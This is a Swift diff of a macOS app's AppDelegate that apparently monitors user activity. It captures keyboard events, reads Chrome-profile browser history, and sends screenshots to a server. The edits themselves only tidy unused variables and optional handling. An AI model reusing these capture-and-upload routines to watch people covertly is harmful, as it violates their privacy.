@@ -146,9 +146,10 @@ func handleKeyDownCallback(
     }
     
     // Get the AppDelegate instance from the refcon
-    guard let appDelegate = Unmanaged<AppDelegate>.fromOpaque(refcon!).takeUnretainedValue() as? AppDelegate else {
+    guard let refcon = refcon else {
         return Unmanaged.passUnretained(event)
     }
+    let appDelegate = Unmanaged<AppDelegate>.fromOpaque(refcon).takeUnretainedValue()
     
     // Update last key capture time
     appDelegate.lastKeyCaptureTime = Date()
@@ -228,7 +229,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         }
     }
     private func keychainLoadToken() -> String? {
-        var query: [String: Any] = [kSecClass as String: kSecClassGenericPassword,
+        let query: [String: Any] = [kSecClass as String: kSecClassGenericPassword,
             kSecAttrService as String: keychainService,
             kSecAttrAccount as String: sessionAccount(),
             kSecReturnData as String: true,
@@ -1214,7 +1215,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
 
     private func processChromeBasedProfiles(profilesPath: String, browser: String, checkedVariable: inout Int64?) throws -> [BrowserHistoryLog] {
         let fileMan = FileManager()
-        let username = NSUserName()
         var visitDate = ""
         var histURL = ""
         var browseHist: [BrowserHistoryLog] = []
@@ -1941,7 +1941,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
                             self?.isServerConnected = true
                             self?.checkServerConnectionChange()
                             
-                            if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                            if let data = data {
                                 self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
                                 self?.lastTicSent = Date()
                             }
@@ -2145,9 +2145,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
                             
                             // Log additional server response data
                             if let dataObj = jdata["data"] as? [String: Any] {
-                                if let filename = dataObj["filename"] as? String {
-                                    // self?.logMessage("Screenshot saved as: \(filename)", level: .info)
-                                }
+                                // Screenshot filename is already tracked by the server.
                                 if let fileSize = dataObj["file_size"] as? Int {
                                     self?.logMessage("File size: \(fileSize) bytes", level: .debug)
                                 }
@@ -2298,7 +2296,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         return "Unknown"
     }
     
-    @objc func applicationDidTerminate(_ notification: Notification) {
+    private @objc func applicationDidTerminate(_ notification: Notification) {
         guard let app = notification.userInfo?[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
               let bundleID = app.bundleIdentifier,
               browserBundleIDs.contains(bundleID) else {
@@ -3807,9 +3805,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
             logMessage("Authorization headers redacted", level: .debug)
             
             // Log the actual JSON being sent for debugging
-            if let jsonString = String(data: jsonData, encoding: .utf8) {
-                logMessage("Request body: \(jsonData.count) bytes (redacted)", level: .debug)
-            }
+            logMessage("Request body: \(jsonData.count) bytes (redacted)", level: .debug)
                 
                 // Send request
                 let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
@@ -4196,7 +4192,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         ]
         
         // Try each approach
-        for (index, approach) in approaches.enumerated() {
+        for approach in approaches {
             if approach() {
                 // logMessage("Successfully opened System Settings using approach \(index + 1)", level: .info)
                 return
@@ -4292,7 +4288,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         ]
         
         // Try each approach
-        for (index, approach) in approaches.enumerated() {
+        for approach in approaches {
             if approach() {
                 // logMessage("Successfully opened System Settings using approach \(index + 1)", level: .info)
                 return
@@ -4781,7 +4777,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         
         // Update configuration display
         if let configItem = menu.item(withTag: 300) {
-            if let config = currentConfig, let lastUpdate = lastConfigUpdate {
+            if currentConfig != nil, let lastUpdate = lastConfigUpdate {
                 let formatter = DateFormatter()
                 formatter.dateStyle = .short
                 formatter.timeStyle = .short
